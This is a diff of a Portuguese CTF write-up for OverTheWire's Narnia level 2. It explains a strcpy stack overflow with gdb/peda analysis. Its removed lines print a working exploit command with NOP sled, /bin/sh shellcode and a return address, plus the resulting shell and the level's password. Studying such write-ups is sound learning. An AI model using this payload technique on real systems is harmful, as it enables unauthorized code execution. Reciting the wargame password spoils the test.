@@ -22,13 +22,14 @@ Usage: ./narnia2 argument
 
 Executando com o argumento:
 
-```narnia2@melinda:/narnia$ ./narnia2 argumento
+```
+narnia2@melinda:/narnia$ ./narnia2 argumento
 argumentonarnia2@melinda:/narnia$
 ```
 
 Aparentemente ele só imprime o argumento passado e nada mais. Pode-se confirmar o comportamento checando o código fonte:
 
-https://gist.github.com/anonymous/9eb7a87061a1436de489ac2136ca9ce5
+<script src="https://gist.github.com/anonymous/9eb7a87061a1436de489ac2136ca9ce5.js"></script>
 
 Simples.
 
@@ -40,12 +41,15 @@ Apesar de não haver nada de errado em usar strcpy (sei lá que motivo alguém t
 
 Hora de ver um buffer se estourando na prática:
 
-```narnia2@melinda:/narnia$ ./narnia2 `python -c 'print A*150'`
-Segmentation fault```
+```
+narnia2@melinda:/narnia$ ./narnia2 `python -c 'print A*150'`
+Segmentation fault
+```
 
 Apesar do erro <strong><a href="https://pt.wikipedia.org/wiki/Falha_de_segmenta%C3%A7%C3%A3o">Segmentation fault</a></strong> não significar exatamente que o que aconteceu foi mesmo um problema de buffer overflow, já vamos confirmar que o erro foi causado por terem sido passados 150 A's como argumento.
 
-```narnia2@melinda:/narnia$ gdb -q narnia2
+```
+narnia2@melinda:/narnia$ gdb -q narnia2
 Reading symbols from narnia2...(no debugging symbols found)...done.
 (gdb) source /usr/local/peda/peda.py
 gdb-peda$ checksec
@@ -63,7 +67,7 @@ No <a href="https://brenn0.wordpress.com/2016/12/06/level-0-overthewire-ctf-narn
 
 Agora quer saber a razão do segmentation fault?
 
-https://gist.github.com/anonymous/25d4109f19931355b815b4eb1b9f28f9
+<script src="https://gist.github.com/anonymous/25d4109f19931355b815b4eb1b9f28f9.js"></script>
 
 É bastante informação nova se você não conhece sobre <a href="http://www.numaboa.com.br/informatica/queisso/521-registradores">registradores</a>. Por um momento pensei em detalhar tudo usando minhas próprias palavras, mas por que reescrever o que já foi escrito e publicado por aí? Recomendo <a href="http://www.crimesciberneticos.com/2011/03/exploiting-buffer-overflow.html">este</a> bom link que dá uma aula sobre os registradores, o stack e tudo mais que você precisaria para entender o resto da exploração neste write-up (lá chega até a ter informação suficiente para que se possa resolver o chall sem precisar de write-up).
 
@@ -75,7 +79,7 @@ Quando insiro 150 B's e o programa só tem reservado no stack espaço para 128 d
 
 Logo, assim que 128 B's lotam o espaço reservado pela variavel buf, os outros 22 B's sobreescrevem o que vem em seguida e entre esses dados sobreescritos está o endereço de retorno.
 
-[caption id="attachment_1366" align="aligncenter" width="400"]<img class="size-full wp-image-1366" src="https://brenn0.files.wordpress.com/2016/12/stack_frame.jpg" alt="Créditos pela imagem: http://www.crimesciberneticos.com/2011/03/exploiting-buffer-overflow.html" width="400" height="241" /> Créditos pela imagem: http://www.crimesciberneticos.com/2011/03/exploiting-buffer-overflow.html[/caption]
+<img class="size-full wp-image-1366" src="https://brenn0.files.wordpress.com/2016/12/stack_frame.jpg" alt="Créditos pela imagem: http://www.crimesciberneticos.com/2011/03/exploiting-buffer-overflow.html" width="400" height="241" />
 
 É importante que entendas sobre o funcionamento do stack, então, reforço que não ignores <a href="http://www.crimesciberneticos.com/2011/03/exploiting-buffer-overflow.html">este</a> link e pesquise mais pela internet se houver dúvidas.
 
@@ -89,17 +93,18 @@ Basicamente o que precisa ser feito é: inserir instruções no processo e fazer
 
  Mas antes de usar qualquer shellcode, precisa-se saber onde o mesmo estará na memória. Há varias formas de se descobrir isso. Usei o gdb e o peda para pôr um breakpoint no momento que a função main chama strcpy, afinal, tanto o endereço de origem, quanto o endereço de destino da nossa string envenenada serão passados como argumento para a função.
 
-https://gist.github.com/anonymous/6a126497f672ea88e5f3760f4897062b
+<script src="https://gist.github.com/anonymous/6a126497f672ea88e5f3760f4897062b.js"></script>
 
 Logo ali na linha 32 pode-se ver os "Guessed arguments".
 
-```arg[0]: 0xffffd4c0 --0x2c (',')
+```
+arg[0]: 0xffffd4c0 --0x2c (',')
 arg[1]: 0xffffd741 ('B' repeats 150 times)
 ```
 
 Como a <a href="http://www.cplusplus.com/reference/cstring/strcpy/">documentação de strcpy</a> nos conta, temos aí o primeiro argumento <strong>0xffffd4c0</strong> como sendo o destino da cópia da string e <strong>0xffffd741</strong> a origem.
 
-https://gist.github.com/anonymous/caf593f9ec433eafa6fbde9ab756a452
+<script src="https://gist.github.com/anonymous/caf593f9ec433eafa6fbde9ab756a452.js"></script>
 
 Usei o comando 'n' de next para executar e parar na instrução seguinte sem entrar na função (use 's' de step e veja a diferença). E com o comando x/s [endereço] vejo que os B's estão bem guardados nos dois endereços que peguei de strcpy.
 
@@ -107,7 +112,7 @@ Agora é só pôr nesse endereço o shellcode e sobreescrever o endereço de ret
 
 Para mudar o endereço de retorno, preciso saber qual parte dos 150 B's sobreescreveu o mesmo. Também há várias técnicas para descobrir. Muitas vezes consigo calcular o tamanho do stack frame analisando o asm da função, dessa forma, adiciono + 4 ao tamanho do frame e sobreescrevo exatamente o endereço de retorno.
 
-https://gist.github.com/anonymous/fb9335ee41a863cc8bab2aa94b205e90
+<script src="https://gist.github.com/anonymous/fb9335ee41a863cc8bab2aa94b205e90.js"></script>
 
 As instruções responsáveis pela formação do stack frame de main são as 4 primeiras (de main+0 a main+6). A primeira, <strong>push ebp</strong>, salva o valor que aponta para a base do stack (ebp) no próprio stack. A segunda, <strong>mov ebp,esp</strong>, envia o valor da base do stack (ebp) para esp, conhecido como stack pointer e responsável por apontar para o topo do stack. A terceira linha, faz <a href="https://stackoverflow.com/questions/24588858/and-esp-0xfffffff0">isso aqui</a> (começando a ter preguiça de contar tudo). E a quarta, <strong>sub esp,0x90</strong>, subtrai do stack pointer atual o valor 90h que em decimal é 140.
 
@@ -117,7 +122,7 @@ O que mais importante se tira da interpretação dessas instruções é: o taman
 
 É possível provar facilmente se esse valor está correto. Enviarei 140 B's + 4 R's como argumento para o programa e ver o que acontece.
 
-https://gist.github.com/anonymous/564696a8bb80e15d470f2d789feaa5f5
+<script src="https://gist.github.com/anonymous/564696a8bb80e15d470f2d789feaa5f5.js"></script>
 
 Agora temos a faca e o queijo na mão.
 
@@ -125,10 +130,4 @@ Usei o mesmo shellcode usado no <a href="https://brenn0.wordpress.com/2016/12/13
 
 Ainda somei uns bytes ao endereço que peguei sendo argumento de destino para o buffer só para ver o nopsled em ação e ao invés de usar <strong>0xffffd4c0</strong>, usei <strong>0xffffd510 </strong>(faça suas modificações e analise com o gdb se souber).
 
-```narnia2@melinda:/narnia$ ./narnia2 `python -c 'print \x90*92 + \x31\xc0\xb0\x46\x31\xc9\x31\xdb\xcd\x80\xeb\x18\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x31\xc0\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68 + \x10\xd5\xff\xff'`
-$ whoami
-narnia3
-$ cat /etc/narnia_pass/narnia3
-bm9vb29i```
-
-
+<script src="https://gist.github.com/nick-belane/4b353b3fe9075043af5701d3f0436e7b.js"></script>
